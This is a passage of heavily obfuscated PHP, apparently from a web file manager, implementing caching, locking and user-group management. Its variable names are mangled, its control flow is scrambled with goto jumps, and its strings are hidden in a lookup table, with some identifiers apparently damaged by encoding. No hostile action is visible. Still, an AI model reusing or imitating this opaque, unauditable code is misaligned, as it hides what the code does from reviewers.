$_SERVER[ä°„ä°º]; if ($this->findByName($E§İšÚ£ùÁ)) { return !1; } $B˜êÄ›¯˜­ = array($Fñºù‚¦Õ[413] => $E§İšÚ£ùÁ, $Fñºù‚¦Õ[464] => $C‡×–ÙÙÇ, $Fñºù‚¦Õ[1724] => $this->getSort($Fñºù‚¦Õ[256]) + 1); return parent::insert($B˜êÄ›¯˜­); } public function update($føŠ¿“Øå, $f·Èñˆ›¢“) { $féÒìµµ£ =& $_SERVER[ä°„ä°º]; $dÑë°ø×åƒ = $this->listData($føŠ¿“Øå); $BíÅ·„¢«Ë = $this->findByName($f·Èñˆ›¢“[$féÒìµµ£[28]]); if (!$dÑë°ø×åƒ || $BíÅ·„¢«Ë && $BíÅ·„¢«Ë[$féÒìµµ£[393]] != $dÑë°ø×åƒ[$féÒìµµ£[393]]) { return !1; } return parent::update($føŠ¿“Øå, $f·Èñˆ›¢“); } public function moveTop($d»Ì‹‘†…) { $c‹ôÉÓŞß =& $_SERVER[ä°„ä°º]; $B½ÔîŞ²­° = parent::listData(); $cæ¬„ßÄç  = $this->getSort($c‹ôÉÓŞß[255]); foreach ($B½ÔîŞ²­° as &$bø”É½êî±) { if ($bø”É½êî±[$c‹ôÉÓŞß[393]] == $d»Ì‹‘†…) { $bø”É½êî±[$c‹ôÉÓŞß[1743]] = $cæ¬„ßÄç ; continue; } $bø”É½êî±[$c‹ôÉÓŞß[1743]] += 1; } unset($bø”É½êî±); return parent::resetData($B½ÔîŞ²­°); } public function moveBottom($c„¤Åôƒ‡â) { $eŒ÷¨ÔÇ« =& $_SERVER[ä°„ä°º]; $D©¶áò‡ë = $this->getSort($eŒ÷¨ÔÇ«[256]) + 1; return parent::update($c„¤Åôƒ‡â, array($eŒ÷¨ÔÇ«[1743] => $D©¶áò‡ë)); } public function resetSort($C‡í†³…) { goto a×¡½ª™‚¦; bÎó‡Íå®: for ($fÃƒ²ÆâŠ– = 0; $fÃƒ²ÆâŠ– < count($C‡í†³…); $fÃƒ²ÆâŠ–++) { $c÷†’ºš³[$C‡í†³…[$fÃƒ²ÆâŠ–] . $eÇğ²«Ÿ¡†[33]] = $fÃƒ²ÆâŠ– + 1; } $DŠ‚À®®´‹ = parent::listData(); foreach ($DŠ‚À®®´‹ as &$a³‰‹º¤ø) { $B·—Êº¯ö· = $c÷†’ºš³[$a³‰‹º¤ø[$eÇğ²«Ÿ¡†[393]]]; $a³‰‹º¤ø[$eÇğ²«Ÿ¡†[1743]] = $B·—Êº¯ö· ? $B·—Êº¯ö· : $a³‰‹º¤ø[$eÇğ²«Ÿ¡†[1743]]; } goto aêİÜ™Î÷Œ; aêİÜ™Î÷Œ: unset($a³‰‹º¤ø); return parent::resetData($DŠ‚À®®´‹); goto b’º¶İÌ¦ƒ; a×¡½ª™‚¦: $eÇğ²«Ÿ¡† =& $_SERVER[ä°„ä°º]; $c÷†’ºš³ = array(); $C‡í†³… = is_array($C‡í†³…) ? $C‡í†³… : array(); goto bÎó‡Íå®; b’º¶İÌ¦ƒ: } private function getSort($bÕÁŒìè¤¬) { $cÅï’äèÌ =& $_SERVER[ä°„ä°º]; $bÉ¿É§ƒª  = parent::listData(); $aĞùäÕ°¶ = array_to_keyvalue($bÉ¿É§ƒª , $cÅï’äèÌ[33], $cÅï’äèÌ[1743]); if (!$aĞùäÕ°¶) { $aĞùäÕ°¶ = array(0); } $d–õ˜˜¯÷ = $bÕÁŒìè¤¬ == $cÅï’äèÌ[256] ? max($aĞùäÕ°¶) : min($aĞùäÕ°¶); return intval($d–õ˜˜¯÷); } } goto D•ÁÏÅ–; aÒ×ˆª„: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto CÆÑ¦·ôÁ; b™£ÁÜèšŞ: switch ($DäÎ¡Ì»Áà[$DÇã‚Ï‡ê[815]]) { case $DÇã‚Ï‡ê[17]: self::$handle = Model($DÇã‚Ï‡ê[817]); break; case $DÇã‚Ï‡ê[818]: self::$handle = new CacheRedis($E¤®‡÷†òŠ, $FàÚ’Í£İÌ); break; case $DÇã‚Ï‡ê[819]: self::$handle = new CacheMemcached($E¤®‡÷†òŠ, $FàÚ’Í£İÌ); break; case $DÇã‚Ï‡ê[193]: self::$handle = new CacheFile($E¤®‡÷†òŠ, $FàÚ’Í£İÌ); break; default: break; } return self::$handle; goto aÜèÎÔ¤òî; CÆÑ¦·ôÁ: $DÇã‚Ï‡ê =& $_SERVER[ä°„ä°º]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto EÉ–¿ˆÌÃ…; EÉ–¿ˆÌÃ…: $DäÎ¡Ì»Áà = $GLOBALS[$DÇã‚Ï‡ê[6]][$DÇã‚Ï‡ê[347]]; $E¤®‡÷†òŠ = $DäÎ¡Ì»Áà[$DäÎ¡Ì»Áà[$DÇã‚Ï‡ê[815]]]; $FàÚ’Í£İÌ = $DäÎ¡Ì»Áà[$DÇã‚Ï‡ê[816]]; goto b™£ÁÜèšŞ; aÜèÎÔ¤òî: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bèÇ«ÜÄÖƒ) { if (is_array($bèÇ«ÜÄÖƒ) || is_object($bèÇ«ÜÄÖƒ)) { $bèÇ«ÜÄÖƒ = json_encode($bèÇ«ÜÄÖƒ); } $bèÇ«ÜÄÖƒ = rawurlencode($bèÇ«ÜÄÖƒ); return md5(KOD_SITE_ID . $_SERVER[ä°„ä°º][71] . $bèÇ«ÜÄÖƒ); } public static function get($aÓäº„œ£ä, $cë¿İ§”Â˜ = false) { $FÌ‡¥·Û–‡ = self::key($aÓäº„œ£ä); if ($cë¿İ§”Â˜) { return unserialize(self::init()->get($FÌ‡¥·Û–‡)); } if (!isset(self::$memoryCache[$FÌ‡¥·Û–‡])) { $FòŠÀ¡³½¶ = self::init()->get($FÌ‡¥·Û–‡); self::$memoryCache[$FÌ‡¥·Û–‡] = unserialize($FòŠÀ¡³½¶); } return self::$memoryCache[$FÌ‡¥·Û–‡]; } public static function set($b••ñæ“¬, $cöğ¤Ş, $F¦Ç‘èÅÕ› = false) { goto cÑÉ²£šë´; aƒÉ‡—ñšø: CacheLock::lock($b••ñæ“¬); $cäøãĞ¼·Ğ = self::init()->set($DÂŞñšªù…, serialize($cöğ¤Ş), $F¦Ç‘èÅÕ›); self::$memoryCache[$DÂŞñšªù…] = $cöğ¤Ş; goto Fõäİ–‰ê‹; cÑÉ²£šë´: $DÂŞñšªù… = self::key($b••ñæ“¬); if (isset(self::$memoryCache[$DÂŞñšªù…]) && self::$memoryCache[$DÂŞñšªù…] === $cöğ¤Ş) { return !0; } if ($F¦Ç‘èÅÕ› === 0) { self::$memoryCache[$DÂŞñšªù…] = $cöğ¤Ş; return !0; } goto aƒÉ‡—ñšø; Fõäİ–‰ê‹: CacheLock::unlock($b••ñæ“¬); return $cäøãĞ¼·Ğ; goto EÇ»ª¬Ùô; EÇ»ª¬Ùô: } public static function getCall($E¡ÍÕ¤¡Ú·, $e­éÆ“¶Õæ, $e‚ÍÉ£¥Ş×, $DòŒÏÉ’ = array()) { goto f‚¬Ò»®Ó; BòÛ··É–»: $E÷Ç‚·ÀµÙ = call_user_func_array($e‚ÍÉ£¥Ş×, $DòŒÏÉ’); $E÷Ç‚·ÀµÙ = $E÷Ç‚·ÀµÙ ? $E÷Ç‚·ÀµÙ : $eØ…ÅãÙÌ•[33]; self::set($E¡ÍÕ¤¡Ú·, $E÷Ç‚·ÀµÙ, $e­éÆ“¶Õæ); goto A„ôÑ¦çßÉ; A„ôÑ¦çßÉ: return $E÷Ç‚·ÀµÙ; goto Cß‘¦¶øÓ•; f‚¬Ò»®Ó: $eØ…ÅãÙÌ• =& $_SERVER[ä°„ä°º]; $E÷Ç‚·ÀµÙ = self::get($E¡ÍÕ¤¡Ú·); if ($E÷Ç‚·ÀµÙ || $E÷Ç‚·ÀµÙ === $eØ…ÅãÙÌ•[33]) { return $E÷Ç‚·ÀµÙ; } goto BòÛ··É–»; Cß‘¦¶øÓ•: } public static function remove($Cš•‘ïŠ–Á) { goto Eì¤¯÷ÌÌ; Dóß½Ü„›¤: return $fÕ©ë‡ÃÄ±; goto côÕšŸ‹‹¾; EÜ™¡¾Ğ“î: CacheLock::lock($Cš•‘ïŠ–Á); $fÕ©ë‡ÃÄ± = self::init()->remove($aÕ‹¿Î¯Â»); CacheLock::unlock($Cš•‘ïŠ–Á); goto Dóß½Ü„›¤; Eì¤¯÷ÌÌ: $aÕ‹¿Î¯Â» = self::key($Cš•‘ïŠ–Á); unset(self::$memoryCache[$aÕ‹¿Î¯Â»]); self::clearTimeout(); goto EÜ™¡¾Ğ“î; côÕšŸ‹‹¾: } public static function removeMemory($BÉåøéÑá½) { $fÚ–Ñ¶’•° = self::key($BÉåøéÑá½); unset(self::$memoryCache[$fÚ–Ñ¶’•°]); } public static function clearMemory($cÊµÁ•¤œ = false) { if ($cÊµÁ•¤œ) { $cÊµÁ•¤œ = self::key($cÊµÁ•¤œ); unset(self::$memoryCache[$cÊµÁ•¤œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ä°„ä°º][820])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ä°„ä°º][821])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($eµíŠ×ªÕ, $fë—ô¶Š») { $Dßì–öíÁ =& $_SERVER[ä°„ä°º]; $this->cachePath = $eµíŠ×ªÕ[$Dßì–öíÁ[76]]; $this->prefix = $Dßì–öíÁ[822]; $this->cacheTime = $fë—ô¶Š»; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($d¬ä’²ˆ¦) { $EÌÄÅÛ¶ù =& $_SERVER[ä°„ä°º]; $d¬ä’²ˆ¦ = str_replace(array($EÌÄÅÛ¶ù[823], $EÌÄÅÛ¶ù[97], $EÌÄÅÛ¶ù[70]), $EÌÄÅÛ¶ù[824], $d¬ä’²ˆ¦); return $this->cachePath . $EÌÄÅÛ¶ù[825] . $d¬ä’²ˆ¦ . $EÌÄÅÛ¶ù[826]; } public function set($FìËøŸ×´¶, $c‹…ò×ÂÁõ, $b”ØŠ‚Î™• = false) { $DÇÂ¡œ°œÈ = $this->getFile($FìËøŸ×´¶); if (file_put_contents($DÇÂ¡œ°œÈ, $this->prefix . $c‹…ò×ÂÁõ, LOCK_EX)) { @touch($DÇÂ¡œ°œÈ, intval(time() + $b”ØŠ‚Î™•)); clearstatcache(); return !0; } @unlink($DÇÂ¡œ°œÈ); return !1; } public function get($Dæ—Ó êà) { $d·÷µ”ò’Ñ = $this->getFile($Dæ—Ó êà); if (file_exists($d·÷µ”ò’Ñ) && filemtime($d·÷µ”ò’Ñ) < time()) { @unlink($d·÷µ”ò’Ñ); return !1; } $DÍè·Å”´ñ = @file_get_contents($d·÷µ”ò’Ñ); return substr($DÍè·Å”´ñ, strlen($this->prefix)); } public function remove($E³”ÁÊÇŒ„) { $aß¨¹®ç¯ = $this->getFile($E³”ÁÊÇŒ„); return @unlink($aß¨¹®ç¯); } public function deleteAll() { $EìÙî“âë =& $_SERVER[ä°„ä°º]; $b¤Şëø ğù = scandir($this->cachePath); foreach ($b¤Şëø ğù as $Fò†éõÈË) { $A„ì¦öØõÕ = $this->cachePath . $Fò†éõÈË; if (strpos($A„ì¦öØõÕ, $EìÙî“âë[826]) && strpos($A„ì¦öØõÕ, $EìÙî“âë[827])) { @unlink($A„ì¦öØõÕ); } } } public function clearTimeout() { $DÄ¿¡¤ãÍ‡ =& $_SERVER[ä°„ä°º]; $BÍ†²ÎÏ¦­ = scandir($this->cachePath); foreach ($BÍ†²ÎÏ¦­ as $A»¨÷í×³Ê) { $cŒ¾Ôİˆ™º = $this->cachePath . $A»¨÷í×³Ê; if (strpos($cŒ¾Ôİˆ™º, $DÄ¿¡¤ãÍ‡[826]) && strpos($cŒ¾Ôİˆ™º, $DÄ¿¡¤ãÍ‡[827]) && filemtime($cŒ¾Ôİˆ™º) < time()) { @unlink($cŒ¾Ôİˆ™º); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto F‹ê—ñˆÃ; E¸ßô¼™Á: self::$timeout = $AÓƒòˆ‹æ‚[$cÁå««Ô™¯[828]] ? $AÓƒòˆ‹æ‚[$cÁå««Ô™¯[828]] : 10; $f‚Í‡÷Æˆá = _get($GLOBALS[$cÁå««Ô™¯[6]], $cÁå««Ô™¯[829]); $a™¼ÑŞëø = $AÓƒòˆ‹æ‚[$cÁå««Ô™¯[815]] ? $AÓƒòˆ‹æ‚[$cÁå««Ô™¯[815]] : $cÁå««Ô™¯[193]; goto cà–õÊùŠ; F‹ê—ñˆÃ: $cÁå««Ô™¯ =& $_SERVER[ä°„ä°º]; if (self::$handle) { return self::$handle; } $AÓƒòˆ‹æ‚ = $GLOBALS[$cÁå««Ô™¯[6]][$cÁå««Ô™¯[347]]; goto E¸ßô¼™Á; cà–õÊùŠ: if ($a™¼ÑŞëø == $cÁå««Ô™¯[17] && $f‚Í‡÷Æˆá == $cÁå««Ô™¯[9]) { $a™¼ÑŞëø = $cÁå««Ô™¯[193]; } switch ($a™¼ÑŞëø) { case $cÁå««Ô™¯[818]: self::$handle = new CacheLockRedis(); break; case $cÁå««Ô™¯[819]: self::$handle = new CacheLockMemcached(); break; case $cÁå««Ô™¯[17]: self::$handle = new CacheLockDatabase(); break; case $cÁå««Ô™¯[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fœÏÁ¡¤ÖŸ; fœÏÁ¡¤ÖŸ: } private static function key($d‰Ö¨ÒŸÃ) { return $_SERVER[ä°„ä°º][830] . Cache::key($d‰Ö¨ÒŸÃ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AĞÚ—ìïäŒ = '') { self::$errorMsg = $AĞÚ—ìïäŒ; } public static function lockGlobal($DÉ½³Òä‹ê, $fò†¿Æùë£) { return self::lock($DÉ½³Òä‹ê, $fò†¿Æùë£, !0); } public static function lock($FÍò½ôà¹ä, $f˜«·é®¿ = false, $f³ƒšÉÍ‡Ó = false) { goto B²ˆ†ÜĞê; B²ˆ†ÜĞê: $Aø¹Ş¶©Å =& $_SERVER[ä°„ä°º]; $dÒÙ–¯èì½ = self::init(); $eµ¬Ö’ÄÙŒ = self::key($FÍò½ôà¹ä); goto BÚ´Ùí×™Ê; BÚ´Ùí×™Ê: $f˜«·é®¿ = $f˜«·é®¿ ? $f˜«·é®¿ : self::$timeout; $eÃ“Œ£»À = $dÒÙ–¯èì½->lock($eµ¬Ö’ÄÙŒ, $f˜«·é®¿); if (!$eÃ“Œ£»À) { $CÎŒõ„Î Œ = "\154\x6f\x63\153\40\x65\162\162\157\162\73\153\x65\171\75{$FÍò½ôà¹ä}\x3b\164\151\x6d\145\75{$f˜«·é®¿}\73" . self::$errorMsg . $Aø¹Ş¶©Å[68] . get_caller_msg(); $DÁ¶—¢ÊÏ„ = LNG($Aø¹Ş¶©Å[831]) . "\50{$f˜«·é®¿}\163\x29\56" . LNG($Aø¹Ş¶©Å[832]); $DÁ¶—¢ÊÏ„ .= $Aø¹Ş¶©Å[833]; if (is_string(self::$errorMsg) && self::$errorMsg) { $DÁ¶—¢ÊÏ„ = $DÁ¶—¢ÊÏ„ . $Aø¹Ş¶©Å[834] . self::$errorMsg; } write_log($CÎŒõ„Î Œ, $Aø¹Ş¶©Å[835]); show_json($DÁ¶—¢ÊÏ„, !1); } goto eôäï›×ñÔ; eôäï›×ñÔ: if (!$f³ƒšÉÍ‡Ó) { self::$lockItem[$eµ¬Ö’ÄÙŒ] = !0; } return $eÃ“Œ£»À; goto F´Ö¿©ì‘Ä; F´Ö¿©ì‘Ä: } public static function lockGet($aö–çÅé…ª) { $FŠÉù¬’œĞ = self::key($aö–çÅé…ª); if (self::$lockItem[$FŠÉù¬’œĞ]) { return self::$lockItem[$FŠÉù¬’œĞ]; } return self::init()->lockGet($FŠÉù¬’œĞ); } public static function unlock($FÖòôÊÁ›«) { $aÅŞİ®ìñ• = self::key($FÖòôÊÁ›«); self::$lockItem[$aÅŞİ®ìñ•] = null; return self::init()->unlock($aÅŞİ®ìñ•); } public static function unlockRuntime() { $Ağå×÷ù½× =& $_SERVER[ä°„ä°º]; $f£ÑÚ“½Ş = self::init(); $eÚŞŞ…õŞå = !1; foreach (self::$lockItem as $cô––‰Œ³‡ => $a·„æœï×Ç) { if (!$a·„æœï×Ç) { continue; } $f£ÑÚ“½Ş->unlock($cô––‰Œ³‡); if (!$eÚŞŞ…õŞå) { $eÚŞŞ…õŞå = !0; write_log($Ağå×÷ù½×[836] . $cô––‰Œ³‡ . $Ağå×÷ù½×[68] . get_caller_msg(), $Ağå×÷ù½×[835]); continue; } write_log($Ağå×÷ù½×[836] . $cô––‰Œ³‡, $Ağå×÷ù½×[835]); } self::fileUnlockAll(); } public static function fileLock($aáè‚»Âì) { goto d‚£¾¼¯¡; A®Ç¶¹½Ó: $f„»À öâ = fopen(DATA_PATH . $aáè‚»Âì . $C›Œš™íœÇ[838], $C›Œš™íœÇ[839]); if (!$f„»À öâ) { return !1; } $GLOBALS[$C›Œš™íœÇ[837]][$aáè‚»Âì] = $f„»À öâ; goto c‚À¾ä™‡; eõàó ˆÄ¬: return !1; goto Cšî¶Ç‹ä; c‚À¾ä™‡: if (flock($f„»À öâ, LOCK_EX)) { return !0; } self::unlock($aáè‚»Âì); show_json($C›Œš™íœÇ[840], !1); goto eõàó ˆÄ¬; d‚£¾¼¯¡: $C›Œš™íœÇ =& $_SERVER[ä°„ä°º]; if (!$GLOBALS[$C›Œš™íœÇ[837]]) { $GLOBALS[$C›Œš™íœÇ[837]] = array(); } $GLOBALS[$C›Œš™íœÇ[837]][$aáè‚»Âì] = !1; goto A®Ç¶¹½Ó; Cšî¶Ç‹ä: } public static function fileUnlock($B˜íØøä‘¬) { $A‡±ã¬ƒ¿ =& $_SERVER[ä°„ä°º]; $f†«ªÏ÷ËŸ = $GLOBALS[$A‡±ã¬ƒ¿[837]][$B˜íØøä‘¬]; if (!$f†«ªÏ÷ËŸ) { return; } $GLOBALS[$A‡±ã¬ƒ¿[837]][$B˜íØøä‘¬] = !1; flock($f†«ªÏ÷ËŸ, LOCK_UN); fclose($f†«ªÏ÷ËŸ); } public static function fileUnlockAll() { $cÀœ®®Ú =& $_SERVER[ä°„ä°º]; if (!$GLOBALS[$cÀœ®®Ú[837]]) { return; } foreach ($GLOBALS[$cÀœ®®Ú[837]] as $bÔêñè˜°â => $FØµÃëÊÒß) { if (!$FØµÃëÊÒß) { continue; } $GLOBALS[$cÀœ®®Ú[837]][$bÔêñè˜°â] = !1; flock($FØµÃëÊÒß, LOCK_UN); fclose($FØµÃëÊÒß); } $GLOBALS[$cÀœ®®Ú[837]] = array(); } } goto F¼Š³¶„½; EÁµÏìŞö¼: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\145" => "\x67\x72\157\x75\160\137\155\145\x74\141", "\x6d\145\x74\141\106\x69\145\154\144" => "\147\x72\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($AÛÊÕÒÈ£ó) { $BéøŒŸãŒ =& $_SERVER[ä°„ä°º]; return array($BéøŒŸãŒ[1790] => array($AÛÊÕÒÈ£ó[0], $BéøŒŸãŒ[1791]), $BéøŒŸãŒ[1792] => array($AÛÊÕÒÈ£ó[0], $BéøŒŸãŒ[1791])); } protected function getInfo($D‹›§ŞÁ‹ã) { $e¾±÷»©İŠ = $this->getInfoSimple($D‹›§ŞÁ‹ã); if (!$e¾±÷»©İŠ) { return !1; } return $this->_listDataApplyItem($e¾±÷»©İŠ); } protected function getInfoSimple($b”«±©ŒñÖ, $eŠÙ«¥×Ú = false) { $FÂˆ¤”¶”Ä =& $_SERVER[ä°„ä°º]; if ($eŠÙ«¥×Ú) { $d¤¨œÀÀæ = array($FÂˆ¤”¶”Ä[1720] => intval($b”«±©ŒñÖ)); $CÃßòÊ¼‰¼ = $this->where($d¤¨œÀÀæ)->find(); return is_array($CÃßòÊ¼‰¼) ? $CÃßòÊ¼‰¼ : array(); } return $this->cacheFunctionGet($FÂˆ¤”¶”Ä[1793], $b”«±©ŒñÖ); } protected function groupAdd($d¥ŸŸñ ä°) { goto c¯´÷ïÄÒ²; Aº¹ÄŞ›Å’: if ($C½½Šò‹åİ[$Eéì‡óš[502]]) { $B„Ü¡Ñ¥™ = $C½½Šò‹åİ[$Eéì‡óš[502]] . $C½½Šò‹åİ[$Eéì‡óš[1720]] . $Eéì‡óš[47]; } $b ï“ºØó = array($Eéì‡óš[413] => $this->groupNameAuto($d¥ŸŸñ ä°[$Eéì‡óš[478]], $d¥ŸŸñ ä°[$Eéì‡óš[28]]), $Eéì‡óš[394] => $d¥ŸŸñ ä°[$Eéì‡óš[478]], $Eéì‡óš[566] => $B„Ü¡Ñ¥™, $Eéì‡óš[1794] => $d¥ŸŸñ ä°[$Eéì‡óš[1704]], $Eéì‡óš[1795] => 0, $Eéì‡óš[1724] => 0); if (isset($d¥ŸŸñ ä°[$Eéì‡óš[1743]])) { $b ï“ºØó[$Eéì‡óš[1743]] = $d¥ŸŸñ ä°[$Eéì‡óš[1743]]; } else { $B¿»Å¸½ = $this->max($Eéì‡óš[1743]); if (!$B¿»Å¸½) { $B¿»Å¸½ = 0; } $b ï“ºØó[$Eéì‡óš[1743]] = $B¿»Å¸½ + 1; } goto CºŒ„ĞÄ–Ó; c¯´÷ïÄÒ²: $Eéì‡óš =& $_SERVER[ä°„ä°º]; if (!$d¥ŸŸñ ä°[$Eéì‡óš[478]] && isset($d¥ŸŸñ ä°[$Eéì‡óš[1720]]) && $d¥ŸŸñ ä°[$Eéì‡óš[1720]] == 1) { if ($C½½Šò‹åİ = $this->getInfoSimple($d¥ŸŸñ ä°[$Eéì‡óš[1720]], !0)) { return $d¥ŸŸñ ä°[$Eéì‡óš[1720]]; } } else { $C½½Šò‹åİ = $this->getInfoSimple($d¥ŸŸñ ä°[$Eéì‡óš[478]]); if (!$C½½Šò‹åİ) { return !1; } } $B„Ü¡Ñ¥™ = $Eéì‡óš[512]; goto Aº¹ÄŞ›Å’; CºŒ„ĞÄ–Ó: if (!empty($d¥ŸŸñ ä°[$Eéì‡óš[1720]])) { $b ï“ºØó[$Eéì‡óš[1720]] = $d¥ŸŸñ ä°[$Eéì‡óš[1720]]; } $C‡©¬ä”™¶ = $this->add($b ï“ºØó); $this->setNamePinyin($C‡©¬ä”™¶, $b ï“ºØó[$Eéì‡óš[28]]); goto AĞ•Û¸ğ‚‘; AĞ•Û¸ğ‚‘: if (isset($d¥ŸŸñ ä°[$Eéì‡óš[1796]])) { $this->metaSet($C‡©¬ä”™¶, array($Eéì‡óš[1796] => $d¥ŸŸñ ä°[$Eéì‡óš[1796]], $Eéì‡óš[1797] => $d¥ŸŸñ ä°[$Eéì‡óš[1797]])); unset($d¥ŸŸñ ä°[$Eéì‡óš[1796]]); unset($d¥ŸŸñ ä°[$Eéì‡óš[1797]]); } Model($Eéì‡óš[1227])->groupRootAdd($C‡©¬ä”™¶); return $C‡©¬ä”™¶; goto BÓç¤ïòÛ; BÓç¤ïòÛ: } protected function groupEdit($b¼Ùºäó©, $C‹ÍĞİ­§±) { goto eòÍ“¯¶; cíÕÀîĞòº: if (isset($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[28]]) && $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[28]] != $F Ï÷Ë»…[$C·÷ˆÀçÕ[28]]) { $this->_clearChildrenCache($F Ï÷Ë»…); } return $this->where(array($C·÷ˆÀçÕ[1798] => $b¼Ùºäó©))->save($C‹ÍĞİ­§±); goto C¹ˆ á×ö; eòÍ“¯¶: $C·÷ˆÀçÕ =& $_SERVER[ä°„ä°º]; $F Ï÷Ë»… = $this->getInfoSimple($b¼Ùºäó©); if (!$F Ï÷Ë»…) { return !1; } goto f•»ñ±Ñè…; f•»ñ±Ñè…: if (!empty($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[478]])) { $A²¬²ŠÒ = $this->getInfoSimple($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[478]]); if (!$A²¬²ŠÒ) { return !1; } if ($F Ï÷Ë»…[$C·÷ˆÀçÕ[1720]] == $A²¬²ŠÒ[$C·÷ˆÀçÕ[1720]]) { return !1; } if ($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[478]] != $F Ï÷Ë»…[$C·÷ˆÀçÕ[478]]) { if ($A²¬²ŠÒ[$C·÷ˆÀçÕ[502]] !== $F Ï÷Ë»…[$C·÷ˆÀçÕ[502]] && strpos($A²¬²ŠÒ[$C·÷ˆÀçÕ[502]], $F Ï÷Ë»…[$C·÷ˆÀçÕ[502]] . $F Ï÷Ë»…[$C·÷ˆÀçÕ[1720]] . $C·÷ˆÀçÕ[47]) === 0) { return !1; } $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[566]] = $A²¬²ŠÒ[$C·÷ˆÀçÕ[502]] . $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[478]] . $C·÷ˆÀçÕ[47]; $this->_changeChildLevel($F Ï÷Ë»…, $A²¬²ŠÒ); } } if (isset($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[28]])) { $this->setNamePinyin($b¼Ùºäó©, $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[28]]); } if (isset($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[1796]])) { $this->metaSet($b¼Ùºäó©, array($C·÷ˆÀçÕ[1796] => $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[1796]], $C·÷ˆÀçÕ[1797] => $C‹ÍĞİ­§±[$C·÷ˆÀçÕ[1797]])); unset($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[1796]]); unset($C‹ÍĞİ­§±[$C·÷ˆÀçÕ[1797]]); } goto cíÕÀîĞòº; C¹ˆ á×ö: } private function _clearChildrenCache($Bß½ÔõÒøÈ) { $aäğ…ôÊ‹À =& $_SERVER[ä°„ä°º]; $c–¸Ø÷ƒ = array($aäğ…ôÊ‹À[566] => array($aäğ…ôÊ‹À[525], $Bß½ÔõÒøÈ[$aäğ…ôÊ‹À[502]] . $Bß½ÔõÒøÈ[$aäğ…ôÊ‹À[1720]] . $aäğ…ôÊ‹À[526])); $DÒª¡šŸ¸ = $this->field($aäğ…ôÊ‹À[1720])->where($c–¸Ø÷ƒ)->select(); foreach ($DÒª¡šŸ¸ as $e‘ñóçİ¹) { $this->cacheFunctionClear($aäğ…ôÊ‹À[1799], $e‘ñóçİ¹[$aäğ…ôÊ‹À[1720]]); $this->cacheFunctionClear($aäğ…ôÊ‹À[1793], $e‘ñóçİ¹[$aäğ…ôÊ‹À[1720]]); } } private function _changeChildLevel($bÎä ³©äö, $CÀ‰Ôí”î, $FÀ±–ÏÄ‰‰ = false) { goto bù£‰„Àâ; DË•ÊÀŸˆ”: $this->_clearChildrenCache($bÎä ³©äö); $this->where($AÏâ¦Š¿æš)->data($Dù§Å½ìÆ´)->save(); goto aÓ§‡©•…¿; EŒ­»ØËÄ: if ($FÀ±–ÏÄ‰‰) { $F–‚Ş÷Ö” = $CÀ‰Ôí”î[$eÍ÷¦à±Î’[502]] . $CÀ‰Ôí”î[$eÍ÷¦à±Î’[1720]] . $eÍ÷¦à±Î’[47]; } $AÏâ¦Š¿æš = array($eÍ÷¦à±Î’[566] => array($eÍ÷¦à±Î’[525], $bÎä ³©äö[$eÍ÷¦à±Î’[502]] . $bÎä ³©äö[$eÍ÷¦à±Î’[1720]] . $eÍ÷¦à±Î’[526])); $Dù§Å½ìÆ´ = array($eÍ÷¦à±Î’[566] => array($eÍ÷¦à±Î’[574], "\x72\145\x70\x6c\x61\143\145\50\160\x61\x72\145\x6e\164\x4c\145\x76\145\154\x2c\47{$B˜à³øà¦ª}\x27\54\47{$F–‚Ş÷Ö”}\x27\x29")); goto DË•ÊÀŸˆ”; bù£‰„Àâ: $eÍ÷¦à±Î’ =& $_SERVER[ä°„ä°º]; $B˜à³øà¦ª = $bÎä ³©äö[$eÍ÷¦à±Î’[502]] . $bÎä ³©äö[$eÍ÷¦à±Î’[1720]] . $eÍ÷¦à±Î’[47]; $F–‚Ş÷Ö” = $CÀ‰Ôí”î[$eÍ÷¦à±Î’[502]] . $CÀ‰Ôí”î[$eÍ÷¦à±Î’[1720]] . $eÍ÷¦à±Î’[47] . $bÎä ³©äö[$eÍ÷¦à±Î’[1720]] . $eÍ÷¦à±Î’[47]; goto EŒ­»ØËÄ; aÓ§‡©•…¿: } public function setNamePinyin($FÓó²›‡×ù, $dŠê»Ü”ÈÒ = false) { $cøŒ“ÁøŞâ =& $_SERVER[ä°„ä°º]; if (!$dŠê»Ü”ÈÒ) { $dğíêïÉõ = $this->getInfoSimple($FÓó²›‡×ù); $dŠê»Ü”ÈÒ = $dğíêïÉõ[$cøŒ“ÁøŞâ[28]]; } if (!Input::check($dŠê»Ü”ÈÒ, $cøŒ“ÁøŞâ[569])) { $this->metaSet($FÓó²›‡×ù, $cøŒ“ÁøŞâ[444], null); $this->metaSet($FÓó²›‡×ù, $cøŒ“ÁøŞâ[443], null); return; } $CÑ´Ùùà¶Š = array($cøŒ“ÁøŞâ[444] => str_replace($cøŒ“ÁøŞâ[50], $cøŒ“ÁøŞâ[33], Pinyin::encode($dŠê»Ü”ÈÒ)), $cøŒ“ÁøŞâ[443] => Pinyin::encode($dŠê»Ü”ÈÒ, $cøŒ“ÁøŞâ[570])); $this->metaSet($FÓó²›‡×ù, $CÑ´Ùùà¶Š); } protected 